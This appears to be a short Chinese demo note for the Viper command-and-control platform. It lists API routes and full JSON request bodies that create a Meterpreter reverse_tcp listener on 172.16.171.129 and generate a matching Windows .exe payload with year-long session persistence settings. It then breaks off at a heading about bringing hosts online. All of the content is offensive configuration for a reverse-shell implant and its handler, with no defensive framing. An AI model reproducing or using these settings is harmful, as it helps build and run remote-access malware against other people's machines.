### viper_demo
#### 1、创建监听
```python
# 路由 router.register(r'api/v1/msgrpc/handler', HandleView, basename="Handler")
# 请求体
# {"opts": {"PAYLOAD": "windows/x64/meterpreter/reverse_tcp", "ExitOnSession": false, "LHOST": "172.16.171.129", "LPORT": 1001, "PrependMigrate": false, "AutoUnhookProcess": false, "AutoVerifySessionTimeout": 30, "SessionCommunicationTimeout": 31536000, "SessionExpirationTimeout": 31536000, "SessionRetryTotal": 31536000, "SessionRetryWait": 10, "StageEncodingFallback": true, "proxies_proto": "Direct"}}
```
#### 2、生成载荷
```python
# 路由 router.register(r'api/v1/msgrpc/payload', PayloadView, basename="Payload")
# 请求体
# {"mname": "windows/x64/meterpreter/reverse_tcp", "opts": {"PAYLOAD": "windows/x64/meterpreter/reverse_tcp", "WORKSPACE": null, "VERBOSE": false, "WfsDelay": 2, "EnableContextEncoding": false, "ContextInformationFile": null, "DisablePayloadHandler": false, "ExitOnSession": false, "ListenerTimeout": 0, "LHOST": "172.16.171.129", "LPORT": 1234, "ReverseListenerBindAddress": "0.0.0.0", "PayloadUUIDSeed": "0ba141fe-bd57-11ec-b10f-000c29b3f831", "ReverseListenerBindPort": null, "ReverseAllowProxy": false, "ReverseListenerComm": null, "ReverseListenerThreaded": false, "StagerRetryCount": 10, "StagerRetryWait": 5, "PingbackRetries": 0, "PingbackSleep": 30, "PayloadUUIDRaw": null, "PayloadUUIDName": null, "PayloadUUIDTracking": false, "EnableStageEncoding": false, "StageEncoder": null, "StageEncoderSaveRegisters": "", "StageEncodingFallback": true, "PrependMigrate": false, "PrependMigrateProc": null, "EXITFUNC": "process", "AutoLoadStdapi": true, "AutoVerifySessionTimeout": 30, "InitialAutoRunScript": "", "AutoRunScript": "", "AutoSystemInfo": true, "EnableUnicodeEncoding": false, "HandlerSSLCert": null, "SessionRetryTotal": 31536000, "SessionRetryWait": 10, "SessionExpirationTimeout": 94608000, "SessionCommunicationTimeout": 31536000, "PayloadProcessCommandLine": "", "AutoUnhookProcess": false, "MeterpreterDebugBuild": false, "TARGET": 0, "ID": 0, "Format": "exe"}}
```
#### 3、上线主机